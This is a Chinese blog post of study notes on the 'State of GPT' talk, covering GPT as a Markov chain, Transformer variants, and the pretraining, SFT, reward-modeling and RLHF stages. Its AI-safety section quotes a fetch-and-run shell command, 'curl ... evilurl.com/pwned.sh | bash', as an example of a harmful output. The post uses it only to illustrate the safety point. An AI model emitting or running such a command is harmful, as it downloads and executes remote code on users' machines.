---
title: GPT学习分享
tags:
  - blog
categories:
  - 未分类
toc: true
toc_number: true
abbrlink: 60917
date: 2024-03-07 11:14:02
updated:
keywords:
description:
top_img:
comments:
cover:
toc_style_simple:
copyright:
copyright_author:
copyright_author_href:
copyright_url:
copyright_info:
mathjax:
katex:
aplayer:
highlight_shrink:
aside:
---

# GPT学习分享

## 序

学习Microsoft Build 2023的分享[State of GPT](https://build.microsoft.com/en-US/sessions/db3f4859-cd30-4445-a0cd-553c3304f8e2)。围绕三个内容讲解：

1. GPT模型
2. 如何训练一个GPT助手
3. 如何有效的将这些助手应用到业务上



## 有限状态马尔可夫链（FSMC）

![img](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/states-2.png)

本文展示了一个极简 GPT，它只有 2 个 token `0` 和 `1`，上下文长度为 `3`； 这样的 GPT 可以看做是一个有限状态马尔可夫链（FSMC）。 我们将用 token sequence `111101111011110` 作为输入对这个极简 GPT 训练 50 次， 得到的状态转移概率符合我们的预期。

## 二进制GPT

### token只有0和1

- 输入：`0010101`
- 输出：下一个token是0的概率(P0)和1的概率(P1)

例如输入的是：`010`，根据自身的参数和状态可能下一个token是1的概率为80%，即

- P(0) = 20%
- P(1) = 80%

### 状态(上下文)和上下文长度

上下文：相邻的三个token，用来预测下一个token，这三个token就是一个上下文，即GPT的**状态**。

上下文长度：用来预测下一个token的token长度，如上文的**3**。

### 状态空间

状态空间即所有可能出现的状态集合。

- **`vocab_size`**：token有多少可能的值。例如上文的0和1。
- **`context_length`**：上下文长度，例如上文的3。

$$
total\_states = vocab\_sizee^{context\_length}
$$

则上午的二进制GPT总的状态数量就是 $2^{3} = 8$​。这也很好理解，所有状态枚举就能出来： {`000`, `001`, `010`, `011`, `100`, `101`, `110`, `111`}。

### 真实的状态空间

真实的GPT中输入也可是1个token和2个token，这里简化的二进制GPT像上面的有限状态马尔可夫链，容易理解。

所以真实的状态空间为
$$
\sum_{i=1}^{content\_length}{vocab\_size}^{i}
$$
所有真实的状态一共有$2^{1}+2^{2}+2^{3}=14$种。为了方便理解，文中使用简化版的状态空间。

### 状态转移

如序列`0101`，从状态`010`到状态`101`就是一次状态转移。

## 问题讨论

### 词典大小和上下文长度

本文讨论的是基于 3 个 token 的二进制 GPT。实际应用场景中，

- `vocab_size` 会远远大于 2，例如 **`50k`**（**`GPT-2`** 的配置）；
- `context_length` 的典型范围 **`2k~32k`**（GPT 2/3/4 的上下文长度分别为 **`2k/4k/32k`**）。

### 模型参数大小（GPT 2/3/4）

本文的例子是用 3bit 来存储一个状态，因此所需存储空间极小；但真实世界中的 GPT 模型所需的存储空间就大了。

[这篇文章](https://www.lesswrong.com/posts/7qSHKYRnqyrumEfbt) 对比了 GPT 和常规计算机（computers）的 size，例如：

- GPT-2 有 **`50257`** 个独立 token，上下文长度是 **`2048`** 个 token。

  每个 token 需要 `log2(50257) ≈ 15.6bit` 来表示，那一个上下文或 **一个状态**需要的存储空间就是 **`15.6 bit/token * 2048 token = 31Kb ≈ 4KB`**。 

- GPT-3 的上下文长度为 **`4096 tokens`**，因此需要 **`8KB`** 内存。

- GPT-4 的上下文长度高达 **`32K tokens`** ，因此大约 **`64KB`** 才能存储一个状态。

### AI 安全

如果把 GPT 看做有限状态马尔可夫链，那 GPT 的安全需要考虑什么？ 答案是**将所有转移到不良状态的概率降低到 0， 例如以 token 序列 `[66, 6371, 532, 82, 3740, 1378, 23542, 6371, 13, 785, 14, 79, 675, 276, 13, 1477, 930, 27334]` 结尾的状态 —— 这个 token sequence 其实就是 **`curl -s https://evilurl.com/pwned.sh | bash`这一 shell 命令的编码，如果真实环境中用户执行了此类恶意命令将是非常危险的。

更一般地来说，可以设想状态空间的某些部分是“红色”的，

- 首先，我们永远不想转移到这些不良状态；
- 其次，这些不良状态很多，无法一次性列举出来；

因此，**GPT 模型本身**必须能够基于训练数据和 Transformer 的归纳偏差， **自己就能知道这些状态是不良的**，转移概率应该设置为 0%。 如果概率没有收敛到足够小（例如 `< 1e-100`），那在足够大型的部署中 （例如`Temperature > 0`，也没有用 `topp/topk` （采样超参数） 强制将低概率置为零） 可能就会命中这个概率，造成安全事故。

### 跟着代码学习构建一个babyGPT

colab文章[^3]

## 原始的Transformer

当时的seq-to-seq（即文本序列转数字序列）模型的标准结构是Teacher forcing的`encoder-decoder`架构。

![encoder - decoder](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/encoder-decoder.png)

<font>Encoder</font>获取整个`Input`序列转换成一个**潜在表示序列**，可以是一个数字序列，即运算中的向量。然后传递给`Decoder`，后者解码成目标序列。

Transformer是一系列拥有`注意力机制(self-attention)`的架构，即能够和上下文有联系。Teacher forcing是指运许`decoder`访问`Input`的技术，也就是结合`Input`和`潜在表示序列`进行采样来生成目标序列，这样能够减少潜在表示序列的压力。理想情况下输入同样的`Input`能够生成两个语义相同的不同句子。

## Transformer的进化

Transformer进化的路上主要有2种语言模型：

- 自编码（auto-encoder）语言模型
- 自回归（auto-regressive）语言模型

### auto-encoder的优缺点

- 优点：自然地融入双向语言模型，同时看到被预测单词的上文和下文
- 缺点：训练和预测不一致。训练的时候输入引入了[Mask]标记，但是在预测阶段往往没有这个[Mask]标记，导致预训练阶段和Fine-tuning阶段不一致。

### auto-regressive的优缺点

- 优点：对于生成类的NLP任务，比如文本摘要，机器翻译等，从左向右的生成内容，天然和自回归语言模型契合。
- 缺点：由于一般是从左到右（当然也可能从右到左），所以只能利用上文或者下文的信息，不能同时利用上文和下文的信息。

### 变化

原始的Transformer模型很适合<font>机器翻译</font>，因为机器翻译正是一个文本序列转换成另一个文本序列（seq-to-seq）的过程。

在解决一些实际任务的时候，并不需要完整的`encoder`和`decoder`结构，经过使用单一结构和堆的尽可能高的层数，然后使用大量语料训练，出现了两个突出的模型，即`BERT`和`GPT-2`。

![transformer](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/4-transformer.webp)

![gpt-bert](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/4-gpt-bert.webp)

![gpt区分](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/4-gpt-his2.webp)

BERT和GPT训练都使用了**Masked Self-Attention**的方式。BERT在训练中通过对随机单词进行Mask，然后推测Mask的单词；GPT则是通过屏蔽下文的单词进行训练，通过输入的序列预测下一个可能出现的单词。在训练数据上两者也有区别，BERT在大量的英文数据和维基百科中进行训练，语料多但是没有经过筛选，GPT则是寻找在Reddit社交媒体、维基百科和英文书籍上的优质文章进行训练。

参数量：

- BERT：340M
- GPT-2：1.5B

![mask attention](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/4-mask.png)

## 训练AI助手引言

训练大模型助手主要分成四个阶段：

1. **预训练**（pre-training）
2. **监督微调**（supervised fine tuning, SFT）
3. **奖励建模**（reward modeling）
4. **强化学习**（reinforcement learning）

每个阶段又分成三个部分，**数据集**、**算法训练**、**模型输出**。

![img](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/training-pipeline.png)

## 预训练

这个阶段占据了绝大多数的时间和算力，占据比例超过90%，

### 数据集

首先需要收集大量的数据。例如，下面是 Meta [训练 LLaMA 所用的数据集](https://arthurchiao.art/blog/llama-paper-zh/)，

| 占比  | 数据集        | 迭代次数（Epochs） | 数据集大小（Disk size） |
| ----- | ------------- | ------------------ | ----------------------- |
| 67.0% | CommonCrawl   | 1.10               | 3.3 TB                  |
| 15.0% | C4            | 1.06               | 783 GB                  |
| 4.5%  | Github        | 0.64               | 328 GB                  |
| 4.5%  | Wikipedia     | 2.45               | 83 GB                   |
| 4.5%  | Books         | 2.23               | 85 GB                   |
| 2.5%  | ArXiv         | 1.06               | 92 GB                   |
| 2.0%  | StackExchange | 1.03               | 78 GB                   |

表 1：LLaMA 预训练数据。
其中 epochs 是用 1.4T tokens 预训练时的迭代次数。用 1T tokens 预训练时也是用的这个数据集比例。

可以大致看到这些数据集的类型。它们混合在一起，然后根据比例进行采样，得到 GPT 神经网络的训练集。

### 文本token化

在实际训练这些数据之前，需要经过一个**预处理步骤**，即 **token 化**。

- 将**原始文本**翻译成**整数序列**，后者是 GPT 的表示方式。
  - 一个 token 可能是一个单词、一个词根、标点、标点+单词等等；
  - **每个 token 平均对应 0.75 个单词**；
  - 所有的独立 token 组成一个词典（词汇表），典型的词典大小：**10k~100k tokens**；
- 这种**文本/token 转换是无损的**，有很多算法，例如常用的字节对编码。

将数据集的文本进行编码、序列化，得到矢量数据，这样能够更好将自然语言在数学上映射出关联的紧密程度。每个token是语句可拆分的最小单位，例如一个单词、一个符号。

![img](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/tokenizer.png)

### 超参数

接下来需要考虑控制阶段的超参数。这里拿两个具体模型 GPT-3/LLaMA 作为例子，

- GPT-4 的训练信息公开比较少，所以这里使用 GPT-3 的数据，注意 GPT-3 已经是三年前的模型了。
- [LLaMA](https://arthurchiao.art/blog/llama-paper-zh/) 是 Meta 最近发布的一个开源模型，数据比较新，信息比较全。

在GPT-3和LLaMA中主要关注**词汇表大小**、**上下文长度**、**参数数量**。

<font>**词汇表大小**</font>通常为10k个token。

<font>**上下文长度**</font>通常为2k/4k，有时甚至100k，这决定了模型在预测阶段中，预测序列下一个token所能看到的最大token数量。

<font>**参数数量**</font>一定程度上决定模型的性能，但不是绝对的。例如LLaMA在1.4万亿个token上训练，训练时间更长，相较在0.3万亿个token训练的GPT-3表现效果更好，但是LLaMA的最大参数是65B，比GPT-3的175B少了**将近2/3**。

![GPT-3 vs. LLaMA 超参数对比](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/gpt3-vs-llama.png)

### 硬件环境和成本

|       | GPU                 | 训练时长  | 训练成本           |
| :---- | :------------------ | :-------- | :----------------- |
| GPT-3 | 约**`一万张 V100`** | 30 天左右 | $100 万 ~ $1000 万 |
| LLaMA | **`两千张 A100`**   | 21 天     | $500 万            |

> V100/A100 [算力对比参考](https://arthurchiao.art/blog/gpu-prices/)。

这些都是在预训练阶段应该考虑的。

### 训练过程

输入给Transformer的是`(B, T)`的矩阵，`B`表示批次大小，`T`表示上下文长度。每个上下文中序列（即连续完成的单句）末尾要添加标识符，上下文的开头和末尾则不需要添加。

![img](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/hyperparams.png)

### 预测下一个token

预测下一个token只能使用**当前行**的**前T个token**进行预测。下一个token有<font>词汇表数量N</font>种可能性。概率根据输入服从某种分布。

![img](https://arthurchiao.art/assets/img/how-to-train-a-gpt-assistant/hyperparams-2.png)

现在看个更真实的训练，《纽约时报》团队在莎士比亚数据集上训练了一个小型 GPT。 下面是一小段莎士比亚文本和训练之后的采样效果：

![img](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/training-process.png)

采样的方式是预测下一个 token，可以看到：

- 左下角：开始时，GPT 的权重是完全随机的，因此也会得到完全随机的采样输出。
- 右边：随着 GPT 训练时间越来越长，会得到越来越一致和连贯的采样输出。

### 损失函数

控制训练的精度和梯度，即训练的效果和速度。

![img](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/training-curves.png)

## 基座模型

通过一个月的训练，在**通用语料**上构建的**基座模型**，能够针**对任意的下游任务进行微调**，预测的结果通常语句通顺、语义连贯。

### 分类任务

针对分类任务进行**微调**的话，可以：

- 以前的做法是收集正负样本，训练某种NLP模型。
- 现在的做法是忽略情感分类，通过训练大型 Transformer，进行few-shot或zero-shot的文本生成，具有语义理解和泛化能力，进行高效的微调。

### 提示工程 + 文档补全（GPT-2）

> 在 GPT-2 时代，人们注意到**比微调更好的方法**是**给模型以有效的提示**。 **语言模型功能其实非常单一，它们只想要补全文档**（预测下一个 token 的高级形式），换句话说， 如果你想让它们完成其他任务，就要通过某些方式**骗一下它们**，让它们以为自己在补全文档就行了。——出自[State of GPT译文][1]

![img](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/gpt-2.png)

如下输入：

```
问题：风扇有几个扇叶？
回答：3
问题：摩托车有几个车轮？
回答：
```

可以得到模型生成：

```
2
```

即使GPT-5甚至未来，提示工程都对模型输出有优化作用。这就是<font>few-shot</font>，让它以为自己在补全（模仿）一个文档，而实际上是回答了我们的问题。

下图可以看到，提示工程在很多问题上非常有效，甚至不需要训练任何神经网络或微调。

　![img](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/gpt-2-2.png)

### 基础模型不是助手

基础模型在补充回答之外的效果很差，无法对话和回答问题。通过<font>监督微调（SFT）</font>能够增强模型回答问题的能力，使生成更具有针对性。

![img](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/fig-1.png)

## 监督微调

### 收集高质量数据样本

通常是由**人工提供**数万条像格式是**“提示 + 理想回答”**的<font>高质量文本</font>作为训练数据。

![img](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/sft-dataset.png)

### SFT训练

同预训练同样的算法和训练过程，但只需要短短几天训练即可，例如：`vicuna-13b`。能够得到回答问题的模型，而不是只会补充文本的模型，这才是<font>真正的AI助手</font>。

如果想要更好的效果，还需进一步改进，从人类反馈中学习(RLHF)。

## 奖励建模

RLHF 包括奖励建模和强化学习。

奖励建模阶段则是建立一个评审机制，对SFT模型生成文本进行评分，负反馈，从而优化权重。

### 建立评审机制

在原文中讲述的是利用SFT模型，比较优劣远远简单于文本生成，让SFT模型能够在人工评审的样本中学习，模仿评审，进行类似二元分类的操作，从而对模型生成文本进行比较。

奖励建模的模型同其他几个阶段不同，该模型只对任务进行评分，不适合单独部署，其他阶段的模型都能单独部署使用。

### 奖励

现在来看一下如何对奖励进行建模。

将三次的提示+回答按行排列，

![img](https://arthurchiao.art/assets/img/how-to-train-a-gpt-assistant/rm-training.png)

- **蓝色**的是提示（prompt tokens），每行都一样；
- **黄色**的是 SFT 模型基于 prompt 产生的补全（completion tokens），每次都不同；
- **绿色**的是特殊的 `<|reward|>` token。

这些数据一起作为新的输入，再训练一个 transforer 模型，

- 输入：蓝色+黄色 tokens，即原始 prompt + SFT 模型补全
- 输出：绿色 token，即奖励（分数）

也就是说，这个模型用“原始问题 + SFT 模型补全结果”来预测“SFT 模型补全结果”的好坏。 换句话说，**对每个 SFT 模型的补全质量进行预测**。这个预测用数值表示结果的好坏， 我们将这个转化为一个**损失函数**，并训练我们的模型使得奖励预测与人工给出的 comparison 基准一致。

这就是**训练奖励模型的方法**，这使我们能够对补全的结果好坏进行评分。

### 特点

跟基座模型、SFT 模型以及后面将介绍的强化学习模型相比，奖励模型的最大特点是**不能独立部署**， 也就是说不能单独部署这样的一个模型，然后接受用户提示（输入），给出有意义的输出（补全）。

为什么呢？上一节的原理其实已经给出答案了：奖励模型要求的输入是“问题+回答”，它的功能是对其中的“回答”进行评分，判断其好坏。 因此它只是一个完整系统中的模块，而并不是一个可以直接面向用户的模型。

## 强化学习

### RLHF训练

通过奖励模型对根据提示生成的每个生成进行评分，高质量生成得到加分，反馈到模型权重中。即RLHF的训练过程。反复训练后得到一个可部署的模型，例如**ChatGPT就是RLHF模型**。



## 参数

Temperature 是 NLP 中的一个参数，用于控制生成文本的随机性和创造性。

- 值越大，生成的结果越多样和不可预测；
- **值越小**，生成的结果越保守和**可预测**。

repetition_penalty设置为大于 1 的数值后，能够避免程序输出太多的重复内容（对重复内容进行生成惩罚）。

no_repeat_ngram_size设置为某个整数时，模型在生成的时候，会杜绝连续生成相同的或者连续的 n 个重复词组。

Top_k设置可能出现词的范围，即单次采用token数量，Top_p设置单次累积采用的阈值，越大越好，防止出现重复单词。

## 总结

根据克伯利大学给出的ELO评分，目前**排名前三的都是RLHF模型**，其他均是SFT模型，目前效果最好的是GPT-4模型。

### 为什么要使用 RLHF？

简单回答是：**效果好**。 下图来自 InstructGPT 论文，其中 PPO 模型就是 RLHF 的。 从人类的反馈来看，质量从高到低依次为：RLHF 模型、SFT 模型、基座模型。

![img](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/why-rlhf-1.png)

那么，为什么 RLHF 效果这么好呢？**社区并没有一个公认的解释**， 但这里我可以提供一个可能的原因：**比较（comparison）和生成（generation）在计算上的不对称性**。

以生成一个俳句为例。假设让一个模型写一个关于回形针的俳句，

![img](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/why-rlhf-2.png)

- 如果你是一个承包商，为 SFT 收集数据，那你应该如何为回形针创作一个好的俳句呢？这**很难**；
- 另一方面，但如果给你一些俳句的例子，让你对它们的好坏进行比较（评分），这个就**简单**多了；

因此，判断比生成要容易的多。这种**不对称性使得 comparison 成为一种潜在的更好方式**（好落地，实操性强）， 可以利用人的判断力来创建一个更好的模型。

### 模型的熵

某些情况下，RLHF 模型并不是基础模型的简单改进。特别是，我们注意到 RLHF 模型会**丢失一些熵**。

- 这意味着它们会给出**更加确定性的结果**；相比基础模型，RLHF 模型的输出变化更少；
- 基础模型熵比较大，会给出很多不同的输出。

![img](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/mode-collapse.png)

在以下情况下，我仍然喜欢使用基础模型：已经有 N 个东西，想生成更多类似的东西时。 例如下图，给出了 7 个 pokeman 名字，想得到更多类似的名字，

![img](https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/mode-collapse-2.png)

后面给出的这些名字看着都是虚构的（没去验证）。我认为这种任务基础模型很擅长， 因为它熵比较大，因此能给出多样的、酷炫的、与之前给出的东西相似的输出。

## 引用


1. [State of GPT](https://build.microsoft.com/en-US/sessions/db3f4859-cd30-4445-a0cd-553c3304f8e2)

2. [TRANSFORMERS FROM SCRATCH](https://colab.research.google.com/drive/1SiF0KZJp75rUeetKOWqpsA8clmHP6jMg)

3. [GPT as a finite-state markov chain](https://colab.research.google.com/drive/1SiF0KZJp75rUeetKOWqpsA8clmHP6jMg)

4. [图解GPT](https://github.com/datawhalechina/learn-nlp-with-transformers/blob/main/docs/%E7%AF%87%E7%AB%A02-Transformer%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/2.4-%E5%9B%BE%E8%A7%A3GPT.md)


